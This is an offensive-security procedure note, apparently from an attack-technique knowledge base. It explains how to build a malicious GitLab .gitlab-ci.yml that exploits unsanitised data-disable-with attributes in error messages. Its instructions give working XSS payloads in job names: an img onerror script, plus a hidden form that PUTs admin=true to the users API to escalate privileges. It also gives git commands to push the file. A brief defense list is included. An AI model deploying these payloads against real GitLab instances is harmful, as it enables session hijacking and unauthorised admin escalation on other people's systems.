---
tags:
  - xss
  - gitlab
  - yaml
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:39.285Z'
sub_techniques: []
id: 8489d874-546f-4297-b6a4-82d700d7049f
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-Malicious-GitLab-CI-YAML

## Summary

This procedure creates a .gitlab-ci.yml file with XSS payloads embedded in job names, exploiting the lack of sanitization for the data-disable-with attribute in GitLab's error messages.

## Description

In GitLab, CI job names are user-controlled and displayed unsanitized in error contexts, such as artifact retrieval failures. The v-safe-html directive uses Dompurify but fails to strip data-disable-with, allowing HTML injection like transparent overlays with malicious img onerror handlers. This procedure sets up jobs with such payloads, including a no-CSP alert and a form for potential admin escalation via API PUT requests.

## Requirements

1. Access to a GitLab project with CI/CD enabled
2. Permissions to commit files (developer role or higher)
3. Basic knowledge of YAML syntax

## Defense

Defensive measures and detection strategies:

- Sanitize all user inputs in error messages, including attributes like data-disable-with
- Implement strict CSP to block inline scripts
- Monitor for anomalous job names containing HTML tags

## Objectives

1. Inject XSS payload into job names for later UI rendering
2. Set up job dependencies to trigger errors
3. Prepare for JavaScript execution or form hijacking

## Instructions

### Step 1: Draft the YAML File

**Context**: Define stages, jobs with malicious names, and simple scripts to ensure execution.

Create the .gitlab-ci.yml with the following content:

```yaml
stages:
  - build
  - test

build-job:
  stage: build
  script:
    - echo "hi"
  artifacts:
    paths:
      - artifact.txt

malicious-no-csp-job:
  stage: build
  script:
    - echo "hi"
  variables:
    JOB_NAME: '1. XSS when no CSP<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">'

trigger-xss:
  stage: test
  script:
    - echo "retry me"
  dependencies:
    - build-job
  needs:
    - malicious-no-csp-job

admin-escalate:
  stage: test
  script:
    - echo "form payload"
  variables:
    JOB_NAME: '<form action="/api/v4/users/1" method="post"><input type="hidden" name="_method" value="put"><input type="hidden" name="admin" value="true"></form>'
```

> This YAML defines jobs with payloads in names or variables; adjust for specific escalation targets.

### Step 2: Commit and Push

**Context**: Upload the file to trigger pipeline validation.

Use Git to commit:

```bash
git add .gitlab-ci.yml
git commit -m "Add CI with jobs"
git push origin main
```

> Expected output: Pipeline triggers automatically if configured.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- gitlab
- ci-cd
